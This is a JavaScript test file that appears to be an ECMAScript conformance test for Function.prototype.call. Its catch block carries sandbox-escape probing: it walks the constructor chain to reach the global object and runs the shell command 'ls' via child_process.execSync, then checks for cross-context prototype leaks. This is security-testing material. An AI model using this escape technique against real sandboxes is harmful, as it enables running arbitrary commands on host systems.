try {
    var i = 0;
    var p = {
        toString: function () {
            throw () => {
                return () => {
                };
            };
            return 'a' + ++i;
        }
    };
    var obj = {};
    new Function(p, p, p, 'this.shifted=a3+a2+a1.length;').call(obj, function () {
        return arguments;
    }('a', 'b', 'c', 'd'), '', 2);
    if (obj['shifted'] !== '24') {
        $ERROR('#1: The call method takes one or more arguments, thisArg and (optionally) arg1, arg2 etc, and performs a function call using the [[Call]] property of the object');
    }
    if (typeof this['shifted'] !== 'undefined') {
        $ERROR('#2: The call method takes one or more arguments, thisArg and (optionally) arg1, arg2 etc, and performs a function call using the [[Call]] property of the object');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}